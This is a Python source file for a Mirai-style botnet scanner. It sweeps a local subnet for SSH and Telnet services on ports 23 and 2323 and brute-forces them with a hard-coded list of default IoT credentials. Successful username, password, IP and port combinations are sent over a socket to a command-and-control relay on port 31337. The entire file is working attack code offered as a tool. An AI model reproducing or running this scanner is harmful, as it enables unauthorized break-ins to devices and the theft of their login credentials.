import socket
import time
import sys
import telnetlib
import os
import hashlib
import platform
from random import randrange
from threading import Thread
import paramiko
from colorama import init, Fore



MAlist = [('admin', 'password'),
          ('root', 'vizxv'),
          ('root', 'admin'),
          ('admin', 'admin'),
          ('root', '888888'),
          ('root', 'xmhdipc'),
          ('root', 'default'),
          ('root', 'juantech'),
          ('root', '123456'),
          ('root', '54321'),
          ('support', 'support'),
          ('root', ''),
          ('root', 'root'),
          ('root', '12345'),
          ('user', 'user'),
          ('admin', ''),
          ('root', 'pass'),
          ('admin', 'admin1234'),
          ('root', '1111'),
          ('admin', 'smcadmin'),
          ('admin', '1111'),
          ('root', '666666'),
          ('root', 'password'),
          ('root', '1234'),
          ('root', 'klv123'),
          ('Administrator', 'admin'),
          ('service', 'service'),
          ('supervisor', 'supervisor'),
          ('guest', 'guest'),
          ('guest', '12345'),
          ('admin1', 'password'),
          ('administrator', '1234'),
          ('666666', '666666'),
          ('888888', '888888'),
          ('ubnt', 'ubnt'),
          ('root', 'klv1234'),
          ('root', 'Zte521'),
          ('root', 'hi3518'),
          ('root', 'jvbzd'),
          ('root', 'anko'),
          ('root', 'zlxx.'),
          ('root', '7ujMko0vizxv'),
          ('root', '7ujMko0admin'),
          ('root', 'system'),
          ('root', 'ikwb'),
          ('root', 'dreambox'),
          ('root', 'user'),
          ('root', 'realtek'),
          ('root', '00000000'),
          ('admin', '1111111'),
          ('admin', '1234'),
          ('admin', '12345'),
          ('admin', '54321'),
          ('admin', '123456'),
          ('admin', '7ujMko0admin'),
          ('admin', 'pass'),
          ('admin', 'meinsm'),
          ('tech', 'tech'),
          ('mother', 'fucker')]


# Relay
__RELAY_H__ = "192.168.1.158"
__RELAY_P__ = 31337
__RELAY_PS_ = "||"

__TIMEOUT__ = 2  # seconds
__C2DELAY__ = 5  # seconds
__THREADS__ = 10  # threads Scanner


def get_credentials(pindex):
    global MAlist
    user = MAlist[pindex][0]
    password = MAlist[pindex][1]
    print(f"[Scanner] Trying {user}:{password}")
    pindex += 1
    return user, password


def c2crd(usr, psw, ip, port):
    global __RELAY_H__, __RELAY_P__, __RELAY_PS_
    while True:
        try:
            print("[Scanner] Sending credentials to remote relay..")
            tcpClientA = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcpClientA.connect((__RELAY_H__, __RELAY_P__))
            tcpClientA.send(("!" + __RELAY_PS_ + usr + __RELAY_PS_ + psw +
                            __RELAY_PS_ + ip + __RELAY_PS_ + str(port)).encode('ascii'))
            data = tcpClientA.recv(1024)
            data = str(data, 'utf-8', 'ignore')
            if data == "10":
                tcpClientA.close()
                print("[Scanner] Remote relay returned code 10(ok).")
                break
        except Exception as e:
            print("[Scanner] Unable to contact remote relay (%s)" % str(e))
            time.sleep(10)
            pass

'''  Scan and brute telnet ( 23 & 2323 )'''
def bruteport(ip, port):    #try 23 & 2323

    print(f"[Scanner] Attempting to brute found IP {ip}" )
    response = ""
    tn = None
    need_user = False
    pindex = 0
    while True:
        try:
            user = ""
            password = ""
            if not tn:
                asked_password_in_cnx = False
                tn = telnetlib.Telnet(ip, port)
                print(f"[Scanner] Connection established to found ip {ip}" ) # can connect this ip and port
            while True:
                response = tn.read_until(b":", 1)                           # Wait until you can see: Appears to indicate that you can try to log in
                # print("Response: " + str(response))
                if "Login:" in str(response) or "Username:" in str(response):  # if login or username exist in response
                    print("[Scanner] Received username prompt")
                    need_user = True                                        # If retrying to log in requires entering an account  then set True
                    asked_password_in_cnx = False                           # Did you ask for a password ?
                    user, password = get_credentials(pindex)                # generate pair of account and password
                    tn.write((user + "\n").encode('ascii'))                 # send username to login account 
                elif "Password:" in str(response) or "password" in str(response):    
                    if asked_password_in_cnx and need_user:                 # if ask password before and need account then close connect 
                        tn.close()
                        break
                    asked_password_in_cnx = True
                    if not need_user:
                        user, password = get_credentials(pindex)
                    if not password:
                        print("[Scanner] Bruteforce failed, out of range..")
                        sys.exit(0)
                    print("[Scanner] Received password prompt")
                    tn.write((password + "\n").encode('ascii'))
                if ">" in str(response) or "$" in str(response) or "#" in str(response) or "%" in str(response):
                    # broken
                    print("[Scanner] Brutefoce succeeded %s " % ip + ' : '.join((user, password)))
                    c2crd(user, password, ip, port)
                    pindex = 0
                    return 
                pindex += 1
        except EOFError as e:
            tn = None
            need_user = False
            print("[Scanner] Remote host dropped the connection (%s).." % str(e))
            time.sleep(10)


def is_telent_open(ip):
    print("[Scanner] Scanning %s .." % ip)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(__TIMEOUT__)
    result = sock.connect_ex((ip, 23))
    if result == 0:             # if 23 port connect successful
        print("[Scanner] Found IP address: %s" % ip)
        bruteport(ip, 23)     #  try to brute force this port 23
    else:
        print("[Scanner] %s tcp/23 connectionreset" % ip)  # reset connect
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((ip, 2323))
        print("[Scanner] Trying connection over port 2323")  # try to connect 2323 port
        if result == 0:     # connect success
            print("[Scanner] Found IP address: %s" % ip)
            bruteport(ip, 2323)
        else:               # connect failure
            print("[Scanner] %s fail to find telnet " % ip)
    sock.close()
''' ------------------------------'''

def is_ssh_open(ip):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    pindex = 0
    retry_two_times=False
    while True:
        username, password = get_credentials(pindex)
        pindex += 1
        try:
            client.connect(hostname=ip, username=username, password=password, timeout=3)
        except socket.timeout:
            print(f"[Scanner] Host: {ip} is unreachable, timed out.")
            return 
        except paramiko.AuthenticationException:
            print(f"[Scanner] Invalid credentials for {username}:{password}")
            return False
        except paramiko.SSHException:
            print(f"[Scanner] Quota exceeded, retrying with delay...")
            time.sleep(60)
            if retry_two_times:
                return
            retry_two_times=True
            return is_ssh_open(ip)
        else:
            print(f"[Scanner] Found combo:\n\tHOSTNAME: {ip}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
            return True


def generate_IP(index):
    return f"192.168.1.{index}"


def getOS():
    return platform.system() + " " + platform.release() + " " + platform.version()


def validateC2():
    print("[Scanner] Connecting to remote relay ...")
    while True:
        try:
            tcpClientA = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcpClientA.connect((__RELAY_H__, __RELAY_P__))
            tcpClientA.send("#".encode('ascii'))
            data = tcpClientA.recv(1024)
            data = str(data, 'utf-8', 'ignore')
            if data == "200":
                tcpClientA.close()
                print("[Scanner] Remote relay returned code 200(online).")
                break
        except:
            print("[Scanner] Remote relay unreachable retrying in %s secs ..." % str(__C2DELAY__))
            time.sleep(__C2DELAY__)


def Scanner(choose):
    if choose == 1:
        while True:
            try:
                for i in range(1, 255):
                    is_ssh_open(generate_IP(i))
                for i in range(1, 255):
                    is_telent_open(generate_IP(i))
            except KeyboardInterrupt:
                print("[Scanner] Terminating bot ..")
                break
            except Exception as e:
                print("[Scanner] Error: " + str(e))
                break
    else:
        print("Try to scan Telnet ---------------")
        is_telent_open("192.168.1.167")
        print("Try to scan Telnet ---------------")
        is_ssh_open("192.168.1.167")



if __name__ == '__main__':
    print("[Scanner] Scanner process started ..")
    validateC2()
    Scanner()


'''
for x in range(0, __THREADS__):
    thread = Thread(target = Scanner)
    thread.start()
'''
